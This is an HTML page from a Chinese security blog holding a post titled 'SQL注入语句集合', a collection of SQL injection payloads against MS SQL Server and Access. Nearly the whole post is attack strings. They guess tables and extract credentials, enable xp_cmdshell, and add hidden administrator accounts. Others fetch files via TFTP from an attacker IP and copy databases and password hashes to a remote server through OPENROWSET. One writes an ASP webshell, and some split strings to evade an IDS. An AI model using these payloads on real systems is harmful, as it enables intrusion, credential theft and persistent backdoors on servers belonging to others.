@@ -1,0 +1,1359 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="注入漏洞,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="1.判断有无注入点 ; and 1=1 and 1=2">
+<meta name="keywords" content="注入漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入语句集合">
+<meta property="og:url" content="https://github.com/Chenhaodong875/Chenhaodong875.github.io/2019/10/31/SQL注入语句集合/index.html">
+<meta property="og:site_name" content="CHD-Blog">
+<meta property="og:description" content="1.判断有无注入点 ; and 1=1 and 1=2">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-11-09T13:28:39.902Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入语句集合">
+<meta name="twitter:description" content="1.判断有无注入点 ; and 1=1 and 1=2">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://github.com/Chenhaodong875/Chenhaodong875.github.io/2019/10/31/SQL注入语句集合/">
+
+
+
+
+
+  <title>SQL注入语句集合 | CHD-Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CHD-Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">网络安全</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/Chenhaodong875/Chenhaodong875.github.io/2019/10/31/SQL注入语句集合/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="陈浩东">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/2.jpg">
+    </span>
+
+     <span title="Words count in article">
+     3.3k 字
+     </span>
+
+        ...
+     <span title="Reading time">
+     17 分钟
+     </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CHD-Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入语句集合</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-31T10:21:57+08:00">
+                2019-10-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  3.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time </span>
+                
+                <span title="Reading time">
+                  17
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>1.判断有无</strong>注入点</p>
+<p>; and 1=1 and 1=2</p>
+<a id="more"></a>
+
+<p><strong>2.猜表一般的表的名称无非是admin adminuser user pass password 等..</strong></p>
+<p>and 0&lt;&gt;(select count(*) from *)</p>
+<p>and 0&lt;&gt;(select count(*) from admin) —判断是否存在admin这张表</p>
+<p><strong>3.猜帐号数目 如果遇到0&lt; 返回正确页面， 1&lt;返回错误页面，说明帐号数目就是1个</strong></p>
+<p>and 0&lt;(select count(*) from admin)</p>
+<p>and 1&lt;(select count(*) from admin)</p>
+<p><strong>4.猜解</strong>字段名称 在len( ) 括号里面加上我们想到的字段名称.</p>
+<p>and 1=(select count(<em>) from admin where len(</em>)&gt;0)–</p>
+<p>and 1=(select count(*) from admin where len（用户字段名称name)&gt;0)</p>
+<p>and 1=(select count(*) from admin where len（密码字段名称password)&gt;0)</p>
+<p><strong>5.猜解各个字段的长度 猜解长度就是把&gt;0变换 直到返回正确页面为止</strong></p>
+<p>and 1=(select count(<em>) from admin where len(</em>)&gt;0)</p>
+<p>and 1=(select count(*) from admin where len(name)&gt;6) 错误</p>
+<p>and 1=(select count(*) from admin where len(name)&gt;5) 正确 长度是6</p>
+<p>and 1=(select count(*) from admin where len(name)=6) 正确</p>
+<p>and 1=(select count(*) from admin where len(password)&gt;11) 正确</p>
+<p>and 1=(select count(*) from admin where len(password)&gt;12) 错误 长度是12</p>
+<p>and 1=(select count(*) from admin where len(password)=12) 正确</p>
+<p><strong>6.猜解字符</strong></p>
+<p>and 1=(select count(*) from admin where left(name,1)=a) —猜解用户帐号的第一位</p>
+<p>and 1=(select count(*) from admin where left(name,2)=ab)—猜解用户帐号的第二位</p>
+<p>就这样一次加一个字符这样猜，猜到够你刚才猜出来的多少位了就对了，帐号就算出来了</p>
+<p>and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) –</p>
+<p>这个查询语句可以猜解中文的用户和密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.</p>
+<p>group by users. id having 1=1–</p>
+<p>group by users. id,users.username,users.password,users.privs having 1=1–</p>
+<p>; insert into users values( 666,attacker,foobar,0xffff )–</p>
+<p>UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=logintable-</p>
+<p>UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=logintable WHERE COLUMN_NAME NOT IN</p>
+<p>(login_id)-</p>
+<p>UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=logintable WHERE COLUMN_NAME NOT IN</p>
+<p>(login_id,login_name)-</p>
+<p>UNION SELECT TOP 1 login_name FROM logintable-</p>
+<p>UNION SELECT TOP 1 password FROM logintable where login_name=Rahul–</p>
+<p><strong>看服务器打的</strong>补丁=出错了打了SP4补丁</p>
+<p>and 1=(select @@VERSION)–</p>
+<p><strong>看数据库连接账号的权限，返回正常，证明是服务器角色sysadmin权限。</strong></p>
+<p>and 1=(SELECT IS_SRVROLEMEMBER(sysadmin))–</p>
+<p><strong>判断连接数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA）</strong></p>
+<p>and sa=(SELECT System_user)–</p>
+<p>and user_name()=dbo–</p>
+<p>and 0&lt;&gt;(select user_name()–</p>
+<p><strong>看xp_cmdshell是否删除</strong></p>
+<p>and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = X AND name = xp_cmdshell)–</p>
+<p><strong>xp_cmdshell被删除，恢复，支持</strong><a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=7534903&ss_c=ssc.citiao.link" target="_blank" rel="noopener">绝对路径</a>的恢复</p>
+<p>;EXEC master.dbo.sp_addextendedproc xp_cmdshell,xplog70.dll–</p>
+<p>;EXEC master.dbo.sp_addextendedproc xp_cmdshell,c:\inetpub\wwwroot\xplog70.dll–</p>
+<p><strong>反向PING自己实验</strong></p>
+<p>;use master;declare @s int;exec sp_oacreate “wscript.shell”,@s out;exec sp_oamethod @s,”run”,NULL,”cmd.exe /c ping 192.168.0.1”;–</p>
+<p><strong>加帐号</strong></p>
+<p>;DECLARE @shell INT EXEC SP_OACREATEwscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C:\WINNT[system32](<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=994190&amp;ss_c=ssc.citiao.link)\cmd.exe" target="_blank" rel="noopener">https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=994190&amp;ss_c=ssc.citiao.link)\cmd.exe</a></p>
+<p>/c net user jiaoniang$ 1866574 /add–</p>
+<p><strong>创建一个</strong><a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=40384&ss_c=ssc.citiao.link" target="_blank" rel="noopener">虚拟目录</a>E盘：</p>
+<p>;declare @o int exec sp_oacreatewscript.shell,@o out exec sp_oamethod @o,run,NULL,cscript.exec:\inetpub\wwwroot\mkwebdir.vbs -w “默认Web站点” -v “e”,”e：&quot;–</p>
+<p><strong>访问属性：（配合写入一个webshell）</strong></p>
+<p>declare @o int exec sp_oacreate wscript.shell,@o out exec sp_oamethod @o,run,NULL,cscript.exec:\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse</p>
+<p><strong>爆库 特殊技巧：：%5c=\ 或者把/和\ 修改%5提交</strong></p>
+<p>and 0&lt;&gt;(select top 1 paths from newtable)–</p>
+<p><strong>得到库名（从1到5都是系统的id，6以上才可以判断）</strong></p>
+<p>and 1=(select name from master.dbo.sysdatabases where dbid=7)–</p>
+<p>and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)</p>
+<p>依次提交 dbid = 7,8,9…. 得到更多的数据库名</p>
+<p>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) 暴到一个表 假设为 admin</p>
+<p>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in (Admin)) 来得到其他的表。</p>
+<p>and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin</p>
+<p>and uid&gt;(str(id))) 暴到UID的数值假设为18779569 uid=id</p>
+<p>and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569) 得到一个admin的一个字段，假设为 user_id</p>
+<p>and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569 and name not in</p>
+<p>(id,…)) 来暴出其他的字段</p>
+<p>and 0&lt;(select user_id from BBS.dbo.admin where username&gt;1) 可以得到用户名</p>
+<p>依次可以得到密码。假设存在user_id username,password 等字段</p>
+<p>and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)</p>
+<p>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) 得到表名</p>
+<p>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in(Address))</p>
+<p>and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin and uid&gt;(str(id))) 判断id值</p>
+<p>and 0&lt;&gt;(select top 1 name from BBS.dbo.syscolumns where id=773577794) 所有字段</p>
+<p>id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,* from admin</p>
+<p>id=-1 union select 1,2,3,4,5,6,7,8,*,9,10,11,12,13 from admin (union，access也好用）</p>
+<p><strong>得到WEB路径</strong></p>
+<p>;create table [dbo].[swap] ([swappass]<a href="255">char</a>);–</p>
+<p>and (select top 1 swappass from swap)=1–</p>
+<p>;CREATE TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_regread</p>
+<p>@rootkey=HKEY_LOCAL_MACHINE,@key=SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots,@value_name=/,</p>
+<p>values=@testOUTPUT insert into paths(path) values(@test)–</p>
+<p>;use ku1;–</p>
+<p>;create table cmd (str image);– 建立image类型的表cmd</p>
+<p>存在xp_cmdshell的测试过程：</p>
+<p>;exec master..xp_cmdshell dir</p>
+<p>;exec master.dbo.sp_addlogin jiaoniang$;– 加SQL帐号</p>
+<p>;exec master.dbo.sp_password null,jiaoniang$,1866574;–</p>
+<p>;exec master.dbo.sp_addsrvrolemember jiaoniang$ sysadmin;–</p>
+<p>;exec master.dbo.xp_cmdshell net user jiaoniang$ 1866574 /workstations:* /times:all /passwordchg:yes /passwordreq:yes</p>
+<p>/active:yes /add;–</p>
+<p>;exec master.dbo.xp_cmdshell net localgroup administrators jiaoniang$ /add;–</p>
+<p>exec master..xp_servicecontrol start,schedule 启动服务</p>
+<p>exec master..xp_servicecontrol start,server</p>
+<p>; DECLARE @shell INT EXEC SP_OACREATE wscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C：\WINNT\system32</p>
+<p>\cmd.exe /c net user jiaoniang$ 1866574 /add</p>
+<p>;DECLARE @shell INT EXEC SP_OACREATE wscript.shell,@shell OUTPUT EXEC SP_OAMETHOD @shell,run,null,C：\WINNT\system32\cmd.exe</p>
+<p>/c net localgroup administrators jiaoniang$ /add</p>
+<p>; exec master..xp_cmdshell tftp -i youip get file.exe– 利用TFTP上传文件</p>
+<p>;declare @a sysname set @a=xp_+cmdshell exec @a dir c:\</p>
+<p>;declare @a sysname set @a=xp+_cm’+’dshell exec @a dir c:\</p>
+<p>;declare @a;set @a=db_name();backup database @a to disk=你的IP你的共享目录bak.dat</p>
+<p>如果被限制则可以。</p>
+<p>select * from <a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=63268317&ss_c=ssc.citiao.link" target="_blank" rel="noopener">openrowset</a>(sqloledb,server;sa;,select OK! exec master.dbo.sp_addlogin hax)</p>
+<p>查询构造：</p>
+<p>SELECT * FROM news WHERE id=… AND topic=… AND …..</p>
+<p>adminand 1=(select count(*) from [user] where username=victim and right(left(userpass,01),1)=1) and userpass &lt;&gt;</p>
+<p>select 123;–</p>
+<p>;use master;–</p>
+<p>:a or name like fff%;– 显示有一个叫ffff的用户哈。</p>
+<p>and 1&lt;&gt;(select count(email) from [user]);–</p>
+<p>;update [users] set email=(select top 1 name from sysobjects where xtype=u and status&gt;0) where name=ffff;–</p>
+<p>;update [users] set email=(select top 1 id from sysobjects where xtype=u and name=ad) where name=ffff;–</p>
+<p>;update [users] set email=(select top 1 name from sysobjects where xtype=u and id&gt;581577110) where name=ffff;–</p>
+<p>;update [users] set email=(select top 1 count(id) from password) where name=ffff;–</p>
+<p>;update [users] set email=(select top 1 pwd from password where id=2) where name=ffff;–</p>
+<p>;update [users] set email=(select top 1 name from password where id=2) where name=ffff;–</p>
+<p>上面的语句是得到数据库中的第一个用户表，并把表名放在ffff用户的邮箱字段中。</p>
+<p>通过查看ffff的用户资料可得第一个用表叫ad</p>
+<p>然后根据表名ad得到这个表的ID 得到第二个表的名字</p>
+<p>insert into users values( 666,char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73),char(0x63)+char(0x68)+char(0x72)+char</p>
+<p>(0x69)+char(0x73),0xffff)–</p>
+<p>insert into users values( 667,123,123,0xffff)–</p>
+<p>insert into users values ( 123,admin–,password,0xffff)–</p>
+<p>;and user&gt;0</p>
+<p>;and (select count(*) from sysobjects)&gt;0</p>
+<p>;and (select count(*) from mysysobjects)&gt;0 //为<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=110136&ss_c=ssc.citiao.link" target="_blank" rel="noopener">access数据库</a></p>
+<p><strong>枚举出数据表名</strong></p>
+<p>;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0);–</p>
+<p>这是将第一个表名更新到aaa的字段处。</p>
+<p>读出第一个表，第二个表可以这样读出来（在条件后加上 and name&lt;&gt;；刚才得到的表名）。</p>
+<p>;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0 and name&lt;&gt;vote);–</p>
+<p>然后id=1552 and exists(select * from aaa where aaa&gt;5)</p>
+<p>读出第二个表，一个个的读出，直到没有为止。</p>
+<p>读字段是这样：</p>
+<p>;update aaa set aaa=(select top 1 col_name(object_id（表名），1));–</p>
+<p>然后id=152 and exists(select * from aaa where aaa&gt;5)出错，得到<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=7402621&ss_c=ssc.citiao.link" target="_blank" rel="noopener">字段名</a></p>
+<p>;update aaa set aaa=(select top 1 col_name(object_id（表名），2));–</p>
+<p>然后id=152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名</p>
+<p>[获得数据表名][将字段值更新为表名，再想法读出这个字段的值就可得到表名]</p>
+<p>update 表名 set 字段=(select top 1 name from sysobjects where xtype=u and status&gt;0 [ and name&lt;&gt;；你得到的表名 查出一个加一个])</p>
+<p>[ where 条件] select top 1 name from sysobjects where xtype=u and status&gt;0 and name not in(table1,table2，…）</p>
+<p>通过<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=450949&ss_c=ssc.citiao.link" target="_blank" rel="noopener">SQLSERVER</a>注入漏洞建<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=452939&ss_c=ssc.citiao.link" target="_blank" rel="noopener">数据库管理员</a>帐号和<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=795592&ss_c=ssc.citiao.link" target="_blank" rel="noopener">系统管理员</a>帐号[当前帐号必须是SYSADMIN组]</p>
+<p>[获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名]</p>
+<p>update 表名 set 字段=(select top 1 col_name(object_id（要查询的数据表名），字段列如：1) [ where 条件]</p>
+<p><strong>绕过IDS的检测[使用</strong>变量]</p>
+<p>;declare @a sysname set @a=xp_+cmdshell exec @a dir c:\</p>
+<p>;declare @a sysname set @a=xp+_cm’+’dshell exec @a dir c:\</p>
+<p><strong>开启远程数据库</strong></p>
+<p>基本语法</p>
+<p>select * from OPENROWSET(SQLOLEDB,server=servername;uid=sa;pwd=123,select * from table1 )</p>
+<p>参数： (1) OLEDB Provider name</p>
+<p>其中连接字符串参数可以是任何端口用来连接，比如</p>
+<p>select * from OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table</p>
+<p>复制目标主机的整个数据库insert所有远程表到本地表。</p>
+<p>基本语法：</p>
+<p>insert into OPENROWSET(SQLOLEDB,server=servername;uid=sa;pwd=123,select * from table1) select * from table2</p>
+<p>这行语句将目标主机上table2表中的所有数据复制到远程数据库中的table1表中。实际运用中适当修改连接字符串的IP地址和端口，指向需要的地方，比如：</p>
+<p>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table1) select * from</p>
+<p>table2</p>
+<p>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _sysdatabases)</p>
+<p>select * from master.dbo.sysdatabases</p>
+<p>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _sysobjects)</p>
+<p>select * from user_database.dbo.sysobjects</p>
+<p>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _syscolumns)</p>
+<p>select * from user_database.dbo.syscolumns</p>
+<p><strong>复制数据库：</strong></p>
+<p>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table1) select * from database..table1 insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table2) select * fromdatabase..table2</p>
+<p>复制哈西表（HASH）登录密码的hash存储于sysxlogins中。方法如下：</p>
+<p>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _sysxlogins) select</p>
+<p>* from database.dbo.sysxlogins</p>
+<p>得到hash之后，就可以进行暴力破解。</p>
+<p>遍历目录的方法：先创建一个<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=57227939&ss_c=ssc.citiao.link" target="_blank" rel="noopener">临时表</a>：temp</p>
+<p>;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));–</p>
+<p>;insert temp exec master.dbo.xp_availablemedia;– 获得当前所有驱动器</p>
+<p>;insert into temp(id) exec master.dbo.xp_subdirs c:;– 获得子目录列表</p>
+<p>;insert into temp(id,num1) exec master.dbo.xp_dirtree c:;– 获得所有子目录的目录<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=501687&ss_c=ssc.citiao.link" target="_blank" rel="noopener">树结构</a>，并寸入temp表中</p>
+<p>;insert into temp(id) exec master.dbo.xp_cmdshell type c:\web\index.asp;– 查看某个文件的内容</p>
+<p>;insert into temp(id) exec master.dbo.xp_cmdshell dir c:;–</p>
+<p>;insert into temp(id) exec master.dbo.xp_cmdshell dir c:\ *.asp /s/a;–</p>
+<p>;insert into temp(id) exec master.dbo.xp_cmdshell cscript. C:\Inetpub\AdminScripts\adsutil.vbs enum w3svc</p>
+<p>;insert into temp(id,num1) exec master.dbo.xp_dirtree c:;– （xp_dirtree适用权限PUBLIC）</p>
+<p>写入表：</p>
+<p>语句1：and 1=(SELECT IS_SRVROLEMEMBER(sysadmin));–</p>
+<p>语句2：and 1=(SELECT IS_SRVROLEMEMBER(serveradmin));–</p>
+<p>语句3：and 1=(SELECT IS_SRVROLEMEMBER(setupadmin));–</p>
+<p>语句4：and 1=(SELECT IS_SRVROLEMEMBER(securityadmin));–</p>
+<p>语句5：and 1=(SELECT IS_SRVROLEMEMBER(securityadmin));–</p>
+<p>语句6：and 1=(SELECT IS_SRVROLEMEMBER(diskadmin));–</p>
+<p>语句7：and 1=(SELECT IS_SRVROLEMEMBER(bulkadmin));–</p>
+<p>语句8：and 1=(SELECT IS_SRVROLEMEMBER(bulkadmin));–</p>
+<p>语句9：and 1=(SELECT IS_MEMBER(db_owner));–</p>
+<p>把路径写到表中去：</p>
+<p>;create table dirs(paths varchar(100),id int)–</p>
+<p>;insert dirs exec master.dbo.xp_dirtree c:--</p>
+<p>and 0&lt;&gt;(select top 1 paths from dirs)–</p>
+<p>and 0&lt;&gt;(select top 1 paths from dirs where paths not in(@Inetpub))–</p>
+<p>;create table dirs1(paths varchar(100),id int)–</p>
+<p>;insert dirs exec master.dbo.xp_dirtree e:\web–</p>
+<p>and 0&lt;&gt;(select top 1 paths from dirs1)–</p>
+<p>把<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=276959&ss_c=ssc.citiao.link" target="_blank" rel="noopener">数据库备份</a>到网页目录：下载</p>
+<p>;declare @a sysname; set @a=db_name();backup database @a to disk=e:\web\down.bak;–</p>
+<p>and 1=(Select top 1 name from(Select top 12 id,name from sysobjects where xtype=char(85)) T order by id desc)</p>
+<p>and 1=(Select Top 1 col_name(object_id(USER_LOGIN),1) from sysobjects) 参看相关表。</p>
+<p>and 1=(select user_id from USER_LOGIN)</p>
+<p>and 0=(select user from USER_LOGIN where user&gt;1)</p>
+<p>-=-wscript.shellexample -=-</p>
+<p>declare @o int</p>
+<p>exec sp_oacreate wscript.shell,@o out</p>
+<p>exec sp_oamethod @o,run,NULL,notepad.exe</p>
+<p>; declare @o int exec sp_oacreate wscript.shell,@o out exec sp_oamethod @o,run,NULL,notepad.exe–</p>
+<p>declare @o int,@f int,@t int,@ret int</p>
+<p>declare @line varchar(8000)</p>
+<p>exec sp_oacreate scripting.filesystemobject,@o out</p>
+<p>exec sp_oamethod @o,opentextfile,@f out,c:\boot.ini,1</p>
+<p>exec @ret = sp_oamethod @f,readline,@line out</p>
+<p>while( @ret = 0 )</p>
+<p>begin</p>
+<p>print @line</p>
+<p>exec @ret = sp_oamethod @f,readline,@line out</p>
+<p>end</p>
+<p>declare @o int,@f int,@t int,@ret int</p>
+<p>exec sp_oacreate scripting.filesystemobject,@o out</p>
+<p>exec sp_oamethod @o,createtextfile,@f out,c:\inetpub\wwwroot\foo.asp,1</p>
+<p>exec @ret = sp_oamethod @f,writeline,NULL,</p>
+<p>&lt;% set o = server.createobject(“wscript.shell”): o.run( request.querystring(“cmd”) ) %&gt;</p>
+<p>declare @o int,@ret int</p>
+<p>exec sp_oacreate speech.voicetext,@o out</p>
+<p>exec sp_oamethod @o,register,NULL,foo,bar</p>
+<p>exec sp_oasetproperty @o,speed,150</p>
+<p>exec sp_oamethod @o,speak,NULL,all your sequel servers are belong to,us,528 waitfor delay 00:00:05</p>
+<p>; declare @o int,@ret int exec sp_oacreate speech.voicetext,@o out exec sp_oamethod @o,register,NULL,foo,bar exec</p>
+<p>sp_oasetproperty @o,speed,150 exec sp_oamethod @o,speak,NULL,all your sequel servers are belong to us,528 waitfor delay 00:00:05–</p>
+<p>xp_dirtree适用权限PUBLIC</p>
+<p>exec master.dbo.xp_dirtree c:\</p>
+<p>返回的信息有两个字段subdirectory、depth。Subdirectory字段是字符型，depth字段是整形字段。</p>
+<p>create table dirs(paths varchar(100),id int)</p>
+<p>建表，这里建的表是和上面xp_dirtree相关连，字段相等、类型相同。</p>
+<p>insert dirs exec master.dbo.xp_dirtree c:\</p>
+<p>只要我们建表与存储进程返回的字段相定义相等就能够执行！达到写表的效果.</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/注入漏洞/" rel="tag"># 注入漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
